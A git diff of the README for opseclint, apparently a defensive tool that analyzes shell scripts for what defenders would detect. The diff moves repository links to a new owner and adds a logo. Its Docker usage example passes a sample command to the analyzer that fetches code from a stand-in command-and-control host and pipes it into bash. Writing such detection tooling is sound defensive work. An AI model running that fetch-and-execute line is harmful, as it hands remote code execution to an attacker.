@@ -19,7 +19,8 @@
 <!-- PROJECT HEADER -->
 <br />
 <div align="center">
-  <h1 align="center">🛡️ opseclint</h1>
+  <img src="docs/eye-mark.svg" alt="opseclint" width="88" height="88">
+  <h1 align="center">opseclint</h1>
 
   <p align="center">
     A detection-coverage analyzer for the command line. <em>“what would a defender see?”</em>
@@ -29,9 +30,9 @@
     <br />
     <a href="https://crates.io/crates/opseclint">Install</a>
     &middot;
-    <a href="https://github.com/Gerrrt/opseclint/issues/new?labels=bug&template=bug_report.yml">Report Bug</a>
+    <a href="https://github.com/ezekiellabs/opseclint/issues/new?labels=bug&template=bug_report.yml">Report Bug</a>
     &middot;
-    <a href="https://github.com/Gerrrt/opseclint/issues/new?labels=detection-logic&template=coverage_request.yml">Request Coverage</a>
+    <a href="https://github.com/ezekiellabs/opseclint/issues/new?labels=detection-logic&template=coverage_request.yml">Request Coverage</a>
   </p>
 </div>
 
@@ -147,8 +148,8 @@ cargo build --release            # -> target/release/opseclint
 **Docker**: a tiny (~750 KB, `scratch`-based) image is published to GHCR:
 
 ```bash
-docker run --rm -v "$PWD":/work ghcr.io/gerrrt/opseclint /work/script.sh
-docker run --rm ghcr.io/gerrrt/opseclint -c 'curl http://c2/x | bash'
+docker run --rm -v "$PWD":/work ghcr.io/ezekiellabs/opseclint /work/script.sh
+docker run --rm ghcr.io/ezekiellabs/opseclint -c 'curl http://c2/x | bash'
 ```
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
@@ -347,7 +348,7 @@ A composite action ([`action.yml`](action.yml)) downloads a released binary and
 analyzes a path in CI (Linux runners):
 
 ```yaml
-- uses: Gerrrt/opseclint@v0.1.1
+- uses: ezekiellabs/opseclint@v1
   with:
     path: examples/
     platform: linux-auditd # or windows-sysmon | macos-es
@@ -461,7 +462,7 @@ Distributed under the MIT License. See [`LICENSE`](LICENSE) for more information
 
 Garrett Allen — [@Gerrrt](https://github.com/Gerrrt)
 
-Project Link: [https://github.com/Gerrrt/opseclint](https://github.com/Gerrrt/opseclint)
+Project Link: [https://github.com/ezekiellabs/opseclint](https://github.com/ezekiellabs/opseclint)
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
@@ -484,19 +485,19 @@ Project Link: [https://github.com/Gerrrt/opseclint](https://github.com/Gerrrt/op
 [crates-url]: https://crates.io/crates/opseclint
 [downloads-shield]: https://img.shields.io/crates/d/opseclint?style=flat-square&logo=rust&label=downloads
 [downloads-url]: https://crates.io/crates/opseclint
-[ci-shield]: https://img.shields.io/github/actions/workflow/status/Gerrrt/opseclint/ci.yml?branch=main&style=flat-square&logo=githubactions&logoColor=white&label=CI
-[ci-url]: https://github.com/Gerrrt/opseclint/actions/workflows/ci.yml
+[ci-shield]: https://img.shields.io/github/actions/workflow/status/ezekiellabs/opseclint/ci.yml?branch=main&style=flat-square&logo=githubactions&logoColor=white&label=CI
+[ci-url]: https://github.com/ezekiellabs/opseclint/actions/workflows/ci.yml
 [marketplace-shield]: https://img.shields.io/badge/Marketplace-opseclint-2ea44f?style=flat-square&logo=github
 [marketplace-url]: https://github.com/marketplace/actions/opseclint-detection-coverage
-[lastcommit-shield]: https://img.shields.io/github/last-commit/Gerrrt/opseclint?branch=main&style=flat-square&logo=git&logoColor=white
-[commits-url]: https://github.com/Gerrrt/opseclint/commits/main
-[stars-shield]: https://img.shields.io/github/stars/Gerrrt/opseclint?style=flat-square&logo=github
-[stars-url]: https://github.com/Gerrrt/opseclint/stargazers
-[issues-shield]: https://img.shields.io/github/issues/Gerrrt/opseclint?style=flat-square&logo=github
-[issues-url]: https://github.com/Gerrrt/opseclint/issues
-[license-shield]: https://img.shields.io/github/license/Gerrrt/opseclint?style=flat-square
-[license-url]: https://github.com/Gerrrt/opseclint/blob/main/LICENSE
-[releases-url]: https://github.com/Gerrrt/opseclint/releases
+[lastcommit-shield]: https://img.shields.io/github/last-commit/ezekiellabs/opseclint?branch=main&style=flat-square&logo=git&logoColor=white
+[commits-url]: https://github.com/ezekiellabs/opseclint/commits/main
+[stars-shield]: https://img.shields.io/github/stars/ezekiellabs/opseclint?style=flat-square&logo=github
+[stars-url]: https://github.com/ezekiellabs/opseclint/stargazers
+[issues-shield]: https://img.shields.io/github/issues/ezekiellabs/opseclint?style=flat-square&logo=github
+[issues-url]: https://github.com/ezekiellabs/opseclint/issues
+[license-shield]: https://img.shields.io/github/license/ezekiellabs/opseclint?style=flat-square
+[license-url]: https://github.com/ezekiellabs/opseclint/blob/main/LICENSE
+[releases-url]: https://github.com/ezekiellabs/opseclint/releases
 [rust-shield]: https://img.shields.io/badge/Rust-000000?style=flat-square&logo=rust&logoColor=white
 [rust-url]: https://www.rust-lang.org
 [attack-shield]: https://img.shields.io/badge/MITRE_ATT%26CK-C1272D?style=flat-square
